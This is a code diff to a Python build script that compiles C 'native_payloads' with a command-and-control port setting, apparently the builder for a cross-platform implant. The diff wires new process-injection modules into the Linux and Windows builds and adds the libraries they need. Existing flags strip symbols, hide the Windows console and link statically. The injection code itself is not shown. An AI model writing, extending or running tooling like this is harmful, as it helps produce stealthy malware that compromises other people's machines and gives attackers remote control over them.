@@ -217,10 +217,10 @@ static int {func_name}(int x) {{
         # Platform-specific flags
         if platform == "linux":
             cflags.extend(["-D_LINUX", "-static"])
-            ldflags = ["-Wl,--gc-sections", "-Wl,--strip-all", "-Wl,--build-id=none"]
+            ldflags = ["-Wl,--gc-sections", "-Wl,--strip-all", "-Wl,--build-id=none", "-lpthread", "-ldl"]
         elif platform == "windows":
             cflags.extend(["-D_WIN32", "-mwindows"])
-            ldflags = ["-lws2_32", "-lntdll", "-lkernel32", "-static"]
+            ldflags = ["-lws2_32", "-lntdll", "-lkernel32", "-lpsapi", "-static"]
         else:  # macOS
             cflags.extend(["-D_MACOS"])
             ldflags = ["-framework", "CoreFoundation", "-framework", "Security"]
@@ -230,6 +230,7 @@ static int {func_name}(int x) {{
             f"-I{self.base_path}/core",
             f"-I{self.base_path}/crypto",
             f"-I{self.base_path}/network",
+            f"-I{self.base_path}/inject",
             f"-I{self.base_path}/{platform}",
         ]
         
@@ -241,12 +242,20 @@ static int {func_name}(int x) {{
             str(self.base_path / "crypto" / "aes.c"),
             str(self.base_path / "crypto" / "sha256.c"),
             str(self.base_path / "network" / "protocol.c"),
+            str(self.base_path / "inject" / "inject_core.c"),
         ]
         
         # Add platform-specific sources
-        platform_dir = self.base_path / platform
-        if platform_dir.exists():
-            sources.extend([str(f) for f in platform_dir.glob("*.c")])
+        if platform == "linux":
+            sources.extend([
+                str(self.base_path / "linux" / "linux_impl.c"),
+                str(self.base_path / "inject" / "inject_linux.c"),
+            ])
+        elif platform == "windows":
+            sources.extend([
+                str(self.base_path / "windows" / "winapi.c"),
+                str(self.base_path / "inject" / "inject_windows.c"),
+            ])
         
         # Output file
         output_file = self.output_path / output_name
@@ -266,13 +275,20 @@ static int {func_name}(int x) {{
                     "/workspace/native_payloads/core/commands.c",
                     "/workspace/native_payloads/crypto/aes.c",
                     "/workspace/native_payloads/crypto/sha256.c",
-                    "/workspace/native_payloads/network/protocol.c"
+                    "/workspace/native_payloads/network/protocol.c",
+                    "/workspace/native_payloads/inject/inject_core.c"
                 ]
                 
                 if platform == "linux":
-                    simple_sources.append("/workspace/native_payloads/linux/linux_impl.c")
+                    simple_sources.extend([
+                        "/workspace/native_payloads/linux/linux_impl.c",
+                        "/workspace/native_payloads/inject/inject_linux.c"
+                    ])
                 elif platform == "windows":
-                    simple_sources.append("/workspace/native_payloads/windows/winapi.c")
+                    simple_sources.extend([
+                        "/workspace/native_payloads/windows/winapi.c",
+                        "/workspace/native_payloads/inject/inject_windows.c"
+                    ])
                 
                 simple_cmd = [compiler, "-Os",
                              "-DPLATFORM_LINUX" if platform == "linux" else "-DPLATFORM_WINDOWS",
@@ -280,12 +296,13 @@ static int {func_name}(int x) {{
                              f"-DSERVER_PORT={config.get('c2_port', 4433)}",
                              "-I/workspace/native_payloads/core",
                              "-I/workspace/native_payloads/crypto", 
-                             "-I/workspace/native_payloads/network"
+                             "-I/workspace/native_payloads/network",
+                             "-I/workspace/native_payloads/inject"
                             ] + simple_sources + ["-o", str(output_file)]
                 if platform == "windows":
-                    simple_cmd.extend(["-lws2_32"])
+                    simple_cmd.extend(["-lws2_32", "-lpsapi"])
                 elif platform == "linux":
-                    simple_cmd.extend(["-lpthread"])
+                    simple_cmd.extend(["-lpthread", "-ldl"])
                 
                 result = subprocess.run(simple_cmd, capture_output=True, text=True, timeout=30)
                 
